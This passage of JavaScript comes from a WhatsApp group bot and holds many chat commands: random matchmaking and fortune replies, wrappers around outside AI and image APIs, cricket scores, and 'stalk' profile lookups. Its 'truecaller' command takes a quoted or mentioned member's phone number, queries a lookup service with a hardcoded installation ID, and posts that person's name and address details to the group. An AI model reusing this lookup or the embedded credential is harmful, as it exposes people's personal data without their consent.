break;
	
  
case 'soulmate': {
  if (!m.isGroup) return XliconStickGroup(); // Ensure it's a group
  let member = participants.map(u => u.id);
  let me = m.sender;
  let jodoh = member[Math.floor(Math.random() * member.length)];

  // Image URL to use
  const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

  try {
     
      // Send the message with the image, caption, and mention the users
      await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: `👫Your Soulmate Is\n\n@${me.split('@')[0]}\n\n❤️\n\n@${jodoh.split('@')[0]}`,
          mentions: [me, jodoh] // Mentions both users
      });
  } catch (error) {
      console.error('Error fetching or sending image:', error);
      replygcxlicon('Failed to send image. Please try again later.');
  }
  }            
  break;

      
      
      case 'couple': {
  if (!m.isGroup) return XliconStickGroup(); // Ensure it's a group

  // Get all participants in the group
  let member = participants.map(u => u.id);
  let orang = member[Math.floor(Math.random() * member.length)]; // Random member for one partner
  let jodoh = member[Math.floor(Math.random() * member.length)]; // Random member for the other partner

  // Image URL to use
  const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

  try {
      // Send the message with the image, caption, and mention the users
      await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: `💏Couple\n\n@${orang.split('@')[0]}\n\n❤️\n\n@${jodoh.split('@')[0]}\n\nCieeee, What's Going On❤️💖👀`,
          mentions: [orang, jodoh] // Mentions both users
      });
  } catch (error) {
      console.error('Error sending message:', error);
      await XliconBotInc.sendMessage(m.chat, { text: 'Failed to send message. Please try again later.' });
  }
  }
  break;





  case 'can': {
    if (!text) return replygcxlicon(`❓ Ask a question\n\nExample: ${prefix + command} Can I dance?`);

    let bisa = [`✅ Can`, `❌ Can't`, `🚫 Cannot`, `💯 Of Course You Can!!!`];
    let keh = bisa[Math.floor(Math.random() * bisa.length)];

    let jawab = `*Can ${text}*\nAnswer: ${keh} 🤩`;

    // Image URL to use
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

    try {
        // Send the message with the image and the answer
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: jawab, // Custom message with the question and answer
            mentions: [m.sender] // Mentions the user who asked
        });
    } catch (error) {
        console.error('Error fetching or sending image:', error);
        replygcxlicon('❗ Failed to send image. Please try again later.');
    }
}
break;


case 'is': {
  if (!text) return replygcxlicon(`❓ Ask a question\n\nExample: ${prefix + command} Is she a virgin?`);

  let apa = [`✅ Yes`, `❌ No`, `🤔 It Could Be`, `✔️ That's right`];
  let kah = apa[Math.floor(Math.random() * apa.length)];

  let jawab = `*Is ${text}*\nAnswer: ${kah} 😎`;

  // Image URL to use
  const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

  try {
      // Send the message with the image and the answer
      await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: jawab, // Custom message with the question and answer
          mentions: [m.sender] // Mentions the user who asked
      });
  } catch (error) {
      console.error('Error fetching or sending image:', error);
      replygcxlicon('❗ Failed to send image. Please try again later.');
  }
}
break;

case 'when': {
  if (!text) return replygcxlicon(`❓ Ask a question\n\nExample: ${prefix + command} will I get married?`);

  let kapan = [
      '5 More Days ⏳', '10 More Days ⏳', '15 More Days ⏳', '20 More Days ⏳', '25 More Days ⏳', '30 More Days ⏳',
      '35 More Days ⏳', '40 More Days ⏳', '45 More Days ⏳', '50 More Days ⏳', '55 More Days ⏳', '60 More Days ⏳',
      '65 More Days ⏳', '70 More Days ⏳', '75 More Days ⏳', '80 More Days ⏳', '85 More Days ⏳', '90 More Days ⏳', 
      '100 More Days ⏳', '5 Months More 🗓️', '10 Months More 🗓️', '15 Months More 🗓️', '20 Months More 🗓️', 
      '25 Months More 🗓️', '30 Months More 🗓️', '35 Months More 🗓️', '40 Months More 🗓️', '45 Months More 🗓️', 
      '50 Months More 🗓️', '55 Months More 🗓️', '60 Months More 🗓️', '65 Months More 🗓️', '70 Months More 🗓️', 
      '75 Months More 🗓️', '80 Months More 🗓️', '85 Months More 🗓️', '90 Months More 🗓️', '100 Months More 🗓️', 
      '1 More Year 📅', '2 More Years 📅', '3 More Years 📅', '4 More Years 📅', '5 More Years 📅', 'Tomorrow ⏰', 
      'The Day After Tomorrow ⏰'
  ];

  let koh = kapan[Math.floor(Math.random() * kapan.length)];
  let jawab = `*When ${text}*\nAnswer: ${koh} 🤔`;

  // Image URL to use
  const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

  try {
      // Send the message with the image and the answer
      await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: jawab, // Custom message with the question and answer
          mentions: [m.sender] // Mentions the user who asked
      });
  } catch (error) {
      console.error('Error fetching or sending image:', error);
      replygcxlicon('❗ Failed to send image. Please try again later.');
  }
}
break;


case 'what': {
  if (!text) return replygcxlicon(`❓ Ask a question\n\nExample: ${prefix + command} is your name?`);

  let lel = [`👩‍❤️‍👨 Ask Your GF`, `🤷‍♂️ I Don’t Know`, `👨‍👩‍👧 I Don’t Know, Ask Your Father`];
  let kah = lel[Math.floor(Math.random() * lel.length)];
  let jawab = `*What ${text}* ❓\nAnswer: ${kah} 🤔`;

  // Image URL to use
  const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

  try {
      await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: jawab,
          mentions: [m.sender]
      });
  } catch (error) {
      console.error('Error fetching or sending image:', error);
      replygcxlicon('❗ Failed to send image. Please try again later.');
  }
}
break;

case 'where': {
  if (!text) return replygcxlicon(`❓ Ask a question\n\nExample: ${prefix + command} is your name?`);

  let wherelol = [`🏞️ In the mountain`, `🌕 On Mars`, `🌙 On the moon`, `🌳 In the jungle`, `👩‍👧 I don’t know, ask your mom`, `🤷‍♂️ It could be somewhere`];
  let kah = wherelol[Math.floor(Math.random() * wherelol.length)];
  let jawab = `*Where ${text}* ❓\nAnswer: ${kah} 🤔`;

  // Image URL to use
  const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

  try {
      await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: jawab,
          mentions: [m.sender]
      });
  } catch (error) {
      console.error('Error fetching or sending image:', error);
      replygcxlicon('❗ Failed to send image. Please try again later.');
  }
}
break;

case 'how': {
  if (!text) return replygcxlicon(`❓ Ask a question\n\nExample: ${prefix + command} to date a girl?`);

  let gimana = [`🤔 Ummm...`, `😅 It’s Difficult Bro`, `🚫 Sorry, the bot can’t answer`, `🔍 Try searching on Google`, `😱 Holy cow! Really?`, `😴 I’m too dizzy to answer`, `🙁 Oh, I see :(`, `⏳ Be patient, boss`, `🙄 Really, dude?`];
  let kah = gimana[Math.floor(Math.random() * gimana.length)];
  let jawab = `*How ${text}* ❓\nAnswer: ${kah} 🤔`;

  // Image URL to use
  const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

  try {
      await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: jawab,
          mentions: [m.sender]
      });
  } catch (error) {
      console.error('Error fetching or sending image:', error);
      replygcxlicon('❗ Failed to send image. Please try again later.');
  }
}
break;
      
case 'rate': {
  if (!text) return replygcxlicon(`❓ Example: ${prefix + command} my profile`);

  let ra = Array.from({ length: 100 }, (_, i) => i + 1); // Array of numbers from 1 to 100
  let kah = ra[Math.floor(Math.random() * ra.length)];
  let jawab = `*Rate ${text}* 💯\nAnswer: ${kah}% 🏆`;

  // Image URL to use
  const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

  try {

      // Send the message with the image and the answer
      await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: jawab, // Custom message with the rating
          mentions: [m.sender] // Mentions the user who asked
      });
  } catch (error) {
      console.error('Error fetching or sending image:', error);
      replygcxlicon('❗ Failed to send image. Please try again later.');
  }
}
break;
      
			case 'define': {
   if (!q) return replygcxlicon(`❓ What would you like to define?`);
    try {
        const targetFine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`);
        if (!targetFine || !targetFine.data.list.length) return replygcxlicon('No definition found.');

        const definition = targetFine.data.list[0].definition.replace(/\[|\]/g, "");
        const example = targetFine.data.list[0].example.replace(/\[|\]/g, "");
        const reply = `
📖 *Word:* ${q}
💬 *Definition:* ${definition}
✍️ *Example:* ${example}`;

        // Image URL to use
        const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';


        // Send the message with the image and the reply text
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: reply,
            mentions: [m.sender]
        });
    } catch (err) {
        console.error('Error:', err);
        replygcxlicon(`*${q}* isn't a valid text.`);
    }
}
break;

 //AI COMMANDS HERE       
case 'blackboxai': {
  if (!text) return replygcxlicon(`⚡ *Example:* ${prefix + command} write a program to delete a file 📝`);
  try {
    let gpt = await (await fetch(`https://itzpire.com/ai/blackbox-ai?q=${text}`)).json();
    const reply = `🔥 *Blackbox AI Response* 🔥\n\n💡 *Result:* ${gpt.result}\n\n📝 *Your Request:* ${text}`;
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

    await XliconBotInc.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: reply,
      mentions: [m.sender]
    });
  } catch (e) {
    console.error('Error:', e);
    return replygcxlicon(`❗ *Error:* ${e.message} ⚠️`);
  }
}
break;

case 'travel-assistant': {
  if (!text) return replygcxlicon(`✈️ *Example:* ${prefix + command} how can I visit the Taj Mahal 🏰`);
  try {
    let gpt = await (await fetch(`https://itzpire.com/ai/copilot2trip?q=${text}`)).json();
    if (gpt.status === "error") {
      return replygcxlicon(`❌ *Error:* ${gpt.message}`);
    }
    const reply = `🌍 *Travel Assistant AI* 🌍\n\n🗺️ *Your Request:* ${text}\n\n💬 *Response:* ${gpt.result}`;
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

    await XliconBotInc.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: reply,
      mentions: [m.sender]
    });
  } catch (e) {
    console.error('Error:', e);
    return replygcxlicon("⚠️ *Error* ⚠️");
  }
}
break;
                
case 'dalle': {
  if (!text) return replygcxlicon(`🎤 *• Example:* ${prefix + command} a girl singing in public 🎶`);

  try {
      const apiUrls = [
          'https://aemt.uk.to/dalle?text=',
          'https://meitang.xyz/dalle?text=',
          'https://btch.us.kg/dalle?text=',
          'https://api.tioo.eu.org/dalle?text=',
          'https://api.tioprm.eu.org/dalle?text='
      ];
      const randomApiUrl = apiUrls[Math.floor(Math.random() * apiUrls.length)];
      let response = await fetch(randomApiUrl + encodeURIComponent(text));

      if (!response.ok) return replygcxlicon('❌ Failed to fetch the image. Please try again.');

      let gptImageUrl = await response.json();

      if (!gptImageUrl || !gptImageUrl.url) return replygcxlicon('❌ No image found. Please try again with a different prompt.');

      await XliconBotInc.sendMessage(m.chat, {
          image: { url: gptImageUrl.url },
          caption: `> Dalle 🌟 \n\n _*Here is the result of: ${text} ✨*_`
      }, { quoted: m });

  } catch (e) {
      console.error(e);
      return replygcxlicon("`*Error*`");
  }
}
break;

case 'stablediffusion': {
  if (!text) return replygcxlicon(`🎨 *• Example:* ${prefix + command} school boy 👦`);

  try {
      const apiUrls = [
          'https://aemt.uk.to/stablediffusion?text=',
          'https://meitang.xyz/stablediffusion?text=',
          'https://btch.us.kg/stablediffusion?text=',
          'https://api.tioo.eu.org/stablediffusion?text=',
          'https://api.tioprm.eu.org/stablediffusion?text='
      ];
      const randomApiUrl = apiUrls[Math.floor(Math.random() * apiUrls.length)];
      const timeout = new Promise((_, reject) =>
          setTimeout(() => reject(new Error('⏳ Request timeout')), 15000)
      );

      let response = await Promise.race([
          fetch(randomApiUrl + encodeURIComponent(text)),
          timeout
      ]);

      if (!response.ok) return replygcxlicon('❌ *Failed to fetch the image.* Please try again. 🔄');

      let imageUrl = await response.json();

      if (!imageUrl || !imageUrl.url) return replygcxlicon('❌ *No image found.* Please try again with a different prompt. 🔄');

      await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl.url },
          caption: `✨ *Stable Diffusion* ✨\n\n🖼️ _*Here is the result of: ${text}*_ 🖌️`
      }, { quoted: m });

  } catch (e) {
      console.error(e);
      return replygcxlicon(`❗ *Error:* ${e.message} ⚠️`);
  }
}
break;

case 'lexica': {
    if (!text) return replygcxlicon(`📸 *• Example:* ${prefix + command} a cat 🐱`);

    try {
        const timeout = new Promise((_, reject) =>
            setTimeout(() => reject(new Error('⏳ Request timeout')), 15000)
        );

        let response = await Promise.race([
            fetch(`https://api.maher-zubair.xyz/ai/lexica?apikey=${global.id}&prompt=${encodeURIComponent(text)}`),
            timeout
        ]);

        if (!response.ok) return replygcxlicon('❌ *Failed to fetch the image.* Please try again. 🔄');

        let data = await response.json();

        if (!data.result) return replygcxlicon('❌ *No image found.* Please try again with a different prompt. 🔄');

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: data.result },
            caption: `✨ *Lexica AI* ✨\n\n🖼️ _*Here is the result of: ${text}*_ 🖌️`
        }, { quoted: m });

    } catch (e) {
        console.error(e);
        return replygcxlicon(`❗ *Error:* ${e.message} ⚠️`);
    }
}
break;

case 'photoleap': {
    if (!text) return replygcxlicon(`🌊 *Example:* ${prefix + command} blue sea`);

    const currentTime = Date.now();
    if (currentTime - (global.lastUsedPhotoleap || 0) < 10000) {
        return replygcxlicon("⏳ Cooldown 10 seconds, try again later");
    }
    global.lastUsedPhotoleap = currentTime;

    try {
        let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${encodeURIComponent(text)}`)).json();

        if (!gpt.result_url) return replygcxlicon('❌ *No image found.* Please try again with a different prompt. 🔄');

        const reply = `✨ *Photo Leap AI* ✨\n\n🖼️ _*Here is the result of: ${text}*_ 📷`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: gpt.result_url },
            caption: reply,
            mentions: [m.sender]
        });

    } catch (e) {
        console.error(e);
        return replygcxlicon(`❗ *Error:* ${e.message} ⚠️`);
    }
}
break;
                
case 'ai': case 'gpt': case 'openai': {
    if (!text) return replygcxlicon(`*• Example:* ${prefix + command} what is your name`);

    try {
        const apiUrls = [
            'https://aemt.uk.to/openai?text=',
            'https://meitang.xyz/openai?text=',
            'https://btch.us.kg/openai?text=',
            'https://api.tioo.eu.org/openai?text=',
            'https://api.tioprm.eu.org/openai?text='
        ];
        const randomApiUrl = apiUrls[Math.floor(Math.random() * apiUrls.length)];
        let response = await fetch(randomApiUrl + encodeURIComponent(text));

        if (!response.ok) return replygcxlicon('❌ *Failed to fetch the response.* Please try again. 🔄');

        let gpt = await response.json();

        if (!gpt.result) return replygcxlicon('❌ *No result found.* Please try again with a different prompt. 🔄');

        const reply = `🌟 *OpenAI Response* 🌟\n\n💬 *Response:* ${gpt.result}\n\n📝 *Your Request:* ${text}`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg' },
            caption: reply,
            mentions: [m.sender]
        });

    } catch (e) {
        console.error(e);
        return replygcxlicon(`❗ *Error:* ${e.message} ⚠️`);
    }
}
break;

case 'checkgpt': {
    if (!text) return replygcxlicon(`*• Example:* ${prefix + command} input your text`);

    try {
        let apiUrl = `${global.api}ai/text-detector?apikey=${global.id}&prompt=${encodeURIComponent(text)}`;
        let response = await fetch(apiUrl);

        if (!response.ok) return replygcxlicon('❌ Failed to analyze the text. Please try again.');

        let data = await response.json();

        const feedback = `*🤖 GPT Text Analysis*\n\n`
            + `*📝 Input Text:* \n_${data.result.input_text}_\n\n`
            + `*🌐 Detected Language:* \n_${data.result.detected_language}_\n\n`
            + `*💡 AI Detection Feedback:* \n_${data.result.feedback}_\n\n`
            + `*📊 AI Likelihood:* \n_${data.result.isHuman}% likely human-generated_\n\n`
            + `*💬 Additional Feedback:* \n_${data.result.additional_feedback}_\n`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg' },
            caption: feedback,
            mentions: [m.sender]
        });

    } catch (e) {
        console.error(e);
        return replygcxlicon("❗ *Error analyzing the text. Please try again.*");
    }
}
break;

case 'darky': {
    if (!text) return replygcxlicon(`*• Example:* ${prefix + command} write me a simple code of python`);

    try {
        let response = await (await fetch(`https://evlgpt.onrender.com/egpt?prompt=${encodeURIComponent(text)}`)).json();

        let message = response.message.replace(/GURUGPT V1/g, '𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏');

        const reply = `🔥 *Xlicon AI Response* 🔥\n\n💡 *Result:* ${message}\n\n📝 *Your Request:* ${text}`;

        await XliconBotInc.sendMessage(m.chat, {
            image: { url: 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg' },
            caption: reply,
            mentions: [m.sender]
        });

    } catch (e) {
        console.error('Error:', e);
        return replygcxlicon("❗ *Error*");
    }
}
break;

case 'bing': {
  if (!text) return replygcxlicon(`*• Example:* ${prefix + command} hello`);

  // Define API URLs
  const apiUrls = [
    'https://aemt.uk.to/bingai?text=',
    'https://meitang.xyz/bingai?text=',
    'https://btch.us.kg/bingai?text=',
    'https://api.tioo.eu.org/bingai?text=',
    'https://api.tioprm.eu.org/bingai?text='
  ];

  try {
    // Choose a random API URL from the list
    const apiUrl = apiUrls[Math.floor(Math.random() * apiUrls.length)] + encodeURIComponent(text);
    
    // Fetch data from the selected API
    let response = await (await fetch(apiUrl)).json();
    
    // Prepare the response text with emojis
    const reply = `🔥 *Xlicon AI Response* 🔥\n\n💬 *Response:* ${response.result}\n\n📝 *Your Request:* ${text}`;

    // Image URL to use
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

    // Send the message with the image URL and the reply text
    await XliconBotInc.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: reply,
      mentions: [m.sender]
    });

  } catch (e) {
    console.error('Error:', e);
    return replygcxlicon("❗ *Error*");
  }
}
break;

case 'mathsai': {
  if (!text) return replygcxlicon(`*• Example:* ${prefix + command} what is your name`);
  
  try {
    // Fetch data from the Maths AI API
    let gpt = await (await fetch(`${global.api}ai/math?apikey=${global.id}&prompt=${text}`)).json();

    // Prepare the message with the response
    const reply = `🔥 *Maths AI Response* 🔥\n\n🧮 *Result:* ${gpt.result}\n\n📝 *Your Request:* ${text}`;

    // Image URL to use
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

    // Send the message with the image URL and the reply text
    await XliconBotInc.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: reply,
      mentions: [m.sender]
    });

  } catch (e) {
    console.error('Error:', e);
    return replygcxlicon("❗ *Error occurred while processing the math query.*");
  }
}
break;

case 'yomamajoke': {
  try {
    // Fetch a Yo Mama joke from the API
    let res = await fetch(`https://yomamaindra.onrender.com/jokes`);

    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`);
    }

    let json = await res.json();

    // Extract the joke from the response
    let yoMamaJoke = `${json.joke}`;

    // Create the message with the joke
    const reply = `😂 *Yo Mama Joke* 😂\n\n${yoMamaJoke}`;

    // Image URL to use
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

    // Send the joke with the image URL
    await XliconBotInc.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: reply,
      mentions: [m.sender]
    });

  } catch (error) {
    console.error('API Fetch Error:', error);
    return await XliconBotInc.sendText(m.chat, "An error occurred while fetching the joke. Please try again.");
  }
}
break;

case 'truecaller': {
  let phoneNumber = '';

  // Determine the phone number from text, quoted message, or mentioned user
  if (text) {
    phoneNumber = text.replace(/[^0-9]/g, '');
  } else if (m.quoted) {
    phoneNumber = m.quoted.sender.replace(/[^0-9]/g, '');
  } else if (m.mentionedJid && m.mentionedJid[0]) {
    phoneNumber = m.mentionedJid[0].replace(/[^0-9]/g, '');
  } else {
    return await XliconBotInc.sendText(m.chat, "Please provide a number in international format without +, quote a user, or mention a user.");
  }

  try {
    const installationId = 'a1i0Z--jzbJC6kx-2_s3OMNW2X7O2Qe3ca-XwmHexijCBA6MNKAO2ciUw756zhWj';
    const apiUrl = `https://truecaller-api.vercel.app/search?phone=${encodeURIComponent(phoneNumber)}&id=${installationId}`;

    let response = await fetch(apiUrl);
    if (!response.ok) {
      throw new Error(`API request failed with status ${response.status}`);
    }

    let json = await response.json();
    json.creator = 'ES TEAMS'; // Change creator to Xlicon

    let details = '';
    for (let prop in json) {
      if (prop === 'flagURL') continue;

      if (prop === 'addresses') {
        details += `⚝ *${prop}:*\n`;
        for (let addressProp in json[prop][0]) {
          details += `  ⚝ *${addressProp}:* ${json[prop][0][addressProp]}\n`;
        }
      } else if (prop === 'countryDetails') {
        details += `⚝ *${prop}:*\n`;
        for (let countryProp in json[prop]) {
          if (Array.isArray(json[prop][countryProp])) {
            details += `  ⚝ *${countryProp}:* ${json[prop][countryProp].join(', ')}\n`;
          } else {
            details += `  ⚝ *${countryProp}:* ${json[prop][countryProp]}\n`;
          }
        }
      } else {
        if (prop !== 'flagURL') {
          details += `⚝ *${prop}:* ${json[prop]}\n`;
        }
      }
    }

    // Send the details message with an image link
    const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

    await XliconBotInc.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: details,
      mentions: [m.sender]
    });

  } catch (error) {
    console.error('API Fetch Error:', error);
    return await XliconBotInc.sendText(m.chat, "An error occurred while fetching the phone details. Please try again.");
  }
}
break;


//-------------------------------------------------------------------------------------------------//

// Cricket Commands

// Matches Command
case 'matches':
case 'match':
case 'cricket':
  {
    let res = await fetchJson(`https://api-smd.onrender.com/api/match`);
    const matches = res.results;
    console.log(matches);

    let outputMessage = ""; // Initialize the output message
    matches.forEach((match) => {
      // Change 'matches' to 'match'
      outputMessage += `🏏 *Match*: ${match.title}\n`;
      outputMessage += `🔗 *Link*: ${match.link}\n\n`;
    });

    replygcxlicon(
      `${outputMessage}\n\nType *${prefix}score cricbuzz link* to get detailed result...`
    );
  }
  break;

// Scores Command
case 'scores':
case 'score':
  {
    if (!args[0]) {
      return replygcXlicon(
        `⚠️ *Cricbuzz match Link is required*. Type *${prefix}matches* to get links...`
      );
    }

    let res = await fetchJson(
      `https://api-smd.onrender.com/api/score?url=${args[0]}`
    );
    if (res.error) {
      return replygcXlicon("❌ *No Data Found or Invalid URL...*");
    }

    let txt = `🏏 *Match Summary:*\n\n*${res.results.names}*\n\n`;
    txt += `📝 *Details:*\n`;
    res.results.details.forEach(detail => {
      txt += `📌 ${detail}\n`;
    });
    txt += `\n*Summary*: ${res.results.preview}`;

    replygcxlicon(txt);
  }
  break;

    //-------------------------------------------------------------------------------------------//

   
    
    //--------------------------------------------------------------------------------------------//

    case 'sc': case 'script': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
    let me = m.sender;
    let teks = `✨ *${global.botname} Script* ✨\n\n` +
               `📺 *YouTube:* ${global.websitex}\n` +
               `🐙 *GitHub:* ${global.botscript}\n\n` +
               `👋 *Hi* @${me.split('@')[0]}! \n` +
               `💖 _Don't forget to donate to support us!_ 🍜👇\n` +
               `https://i.ibb.co/3mW8Ywz/DONATE.jpg`;

    sendXliconBotIncMessage(m.chat, { 
        text: teks,
        mentions: [me],
        contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true,
            mentionedJid: [me],
            "externalAdReply": {
                "showAdAttribution": true,
                "renderLargerThumbnail": true,
                "title": global.botname, 
                "containsAutoReply": true,
                "mediaType": 1, 
                "thumbnail": fs.readFileSync("./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg"),
                "mediaUrl": `${wagc}`,
                "sourceUrl": `${wagc}`
            }
        }
    });
}
break;

                
case 'runtime': {
    // Format the uptime string with emojis and decorations
    let lowq = `*⛩️ Bot Uptime ⛩️*\n\n` +
               `🕰️ Es Teams V1  Has Been Online For:*  \n` +
               `💫 ${runtime(process.uptime())} \n\n` +
               `🎉 *Let's keep the chat lively!* `;

    replygcxlicon(lowq);
}
break;
			case 'settings': {
    if (XliconTheCreator) {
        // Show the current settings
        let settingsBot = Object.entries(db.settings[botNumber]).map(([key, value]) => {
            let qhk = (typeof value === 'boolean') ? (value ? '✅ On' : '❌ Off') : value;
            return `*${key.charAt(0).toUpperCase() + key.slice(1)}*: ${qhk}`;
        }).join('\n');
        
        replygcxlicon(`*Current Settings:*\n${settingsBot}`);  // Return settings list

        // Handle specific commands to toggle settings on/off
        if (text === 'anticall on') {
            db.settings[botNumber].anticall = true;
            replygcxlicon('✅ *Anticall Activated*');
        }
        else if (text === 'anticall off') {
            db.settings[botNumber].anticall = false;
            replygcxlicon('❌ *Anticall Deactivated*');
        }
        else if (text === 'autobio on') {
            db.settings[botNumber].autobio = true;
            replygcxlicon('✅ *Autobio Activated*');
        }
        else if (text === 'autobio off') {
            db.settings[botNumber].autobio = false;
            replygcxlicon('❌ *Autobio Deactivated*');
        }
        else if (text === 'autoread on') {
            db.settings[botNumber].autoread = true;
            replygcxlicon('✅ *Autoread Activated*');
        }
        else if (text === 'autoread off') {
            db.settings[botNumber].autoread = false;
            replygcxlicon('❌ *Autoread Deactivated*');
        }
        else if (text === 'autotype on') {
            db.settings[botNumber].autotyping = true;
            replygcxlicon('✅ *Autotype Activated*');
        }
        else if (text === 'autotype off') {
            db.settings[botNumber].autotyping = false;
            replygcxlicon('❌ *Autotype Deactivated*');
        }
        else if (text === 'antiswview on') {
            db.settings[botNumber].readsw = true;
            replygcxlicon('✅ *Read SW Activated*');
        }
        else if (text === 'antiswview off') {
            db.settings[botNumber].readsw = false;
            replygcxlicon('❌ *Read SW Deactivated*');
        }
    } else {
        replygcxlicon('⚠️ *You are not authorized to view or change settings.*');
    }
}
break;

                
case 'ghstalk': case 'githubstalk': {
    if (!q) return replygcxlicon(`*Example:* ${prefix + command} ES TEAMS TECH`);

    await XliconStickWait();
    let githubstalk = require('./lib/scraper');
    let aj = await githubstalk.githubstalk(`${q}`);

    // Create a formatted message with emojis and styling
    let caption = `🌐 *Github Stalker* 🌐\n\n` +
                  `👤 *Username:* ${aj.username}\n` +
                  `🆔 *Nickname:* ${aj.nickname}\n` +
                  `📝 *Bio:* ${aj.bio}\n` +
                  `🔍 *Id:* ${aj.id}\n` +
                  `🔗 *NodeId:* ${aj.nodeId}\n` +
                  `📸 *Profile Picture:* ${aj.profile_pic}\n` +
                  `🌍 *Url Github:* ${aj.url}\n` +
                  `🏷️ *Type:* ${aj.type}\n` +
                  `👥 *Admin:* ${aj.admin}\n` +
                  `🏢 *Company:* ${aj.company}\n` +
                  `📝 *Blog:* ${aj.blog}\n` +
                  `📍 *Location:* ${aj.location}\n` +
                  `✉️ *Email:* ${aj.email}\n` +
                  `📦 *Public Repos:* ${aj.public_repo}\n` +
                  `📜 *Public Gists:* ${aj.public_gists}\n` +
                  `👥 *Followers:* ${aj.followers}\n` +
                  `👣 *Following:* ${aj.following}\n` +
                  `📅 *Created At:* ${aj.created_at}\n` +
                  `🔄 *Updated At:* ${aj.updated_at}`;

    // Send the message with the user's profile picture
    XliconBotInc.sendMessage(m.chat, { 
        image: { url: aj.profile_pic }, 
        caption: caption 
    }, { quoted: m });
}
break;
                
case 'npmstalk': {
    if (!q) return replygcxlicon(`*Example:* ${prefix + command} xliconapi`);

    await XliconStickWait();
    let npmstalk = require('./lib/scraper');
    let eha = await npmstalk.npmstalk(q);
    
    // Create a formatted message for npm stalk
    let npmCaption = `📦 *NPM Stalker* 📦\n\n` +
                     `🌟 *Name:* ${eha.name}\n` +
                     `🔄 *Version Latest:* ${eha.versionLatest}\n` +
                     `🛠️ *Version Publish:* ${eha.versionPublish}\n` +
                     `🔧 *Version Update:* ${eha.versionUpdate}\n` +
                     `📈 *Latest Dependencies:* ${eha.latestDependencies}\n` +
                     `📅 *Publish Dependencies:* ${eha.publishDependencies}\n` +
                     `🕒 *Publish Time:* ${eha.publishTime}\n` +
                     `📆 *Latest Publish Time:* ${eha.latestPublishTime}`;
    
    replygcxlicon(npmCaption);
}
break;

case 'ffstalk': {
    if (!q) return replygcxlicon(`*Example:* ${prefix + command} 946716486`);

    await XliconStickWait();
    let ffstalk = require('./lib/scraper');
    let eeh = await ffstalk.ffstalk(`${q}`);
    
    // Create a formatted message for Free Fire stalk
    let ffCaption = `🔥 *Free Fire Stalker* 🔥\n\n` +
                    `🆔 *ID:* ${eeh.id}\n` +
                    `👤 *Nickname:* ${eeh.nickname}`;
    
    replygcxlicon(ffCaption);
}
break;

case 'mlstalk': {
    if (!q) return replygcxlicon(`*Example:* ${prefix + command} 530793138|8129`);

    await XliconStickWait();
    let mlstalk = require('./lib/scraper');
    let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1]);
    
    // Create a formatted message for Mobile Legend stalk
    let mlCaption = `📱 *Mobile Legend Stalker* 📱\n\n` +
                    `👤 *Username:* ${dat.userName}\n` +
                    `🆔 *ID:* ${q.split("|")[0]}\n` +
                    `🌍 *ID Zone:* ${q.split("|")[1]}`;
    
    replygcxlicon(mlCaption);
}
break;
                
case 'tiktokstalk': {
  if (!text) return replygcxlicon(`Please provide a TikTok username.`);

  const username = text;
  const apiUrl = `${global.api}stalking/tiktok-user2?apikey=${global.id}&user=${username}`;
  
  try {
    // Fetch TikTok user data
    let res = await fetchJson(apiUrl);
    
    if (!res.status) {
      await XliconBotInc.sendMessage(m.chat, { text: '❌ Unable to fetch data. Please try again later.' }, { quoted: m });
      return;
    }

    const user = res.result;
    let txt = `
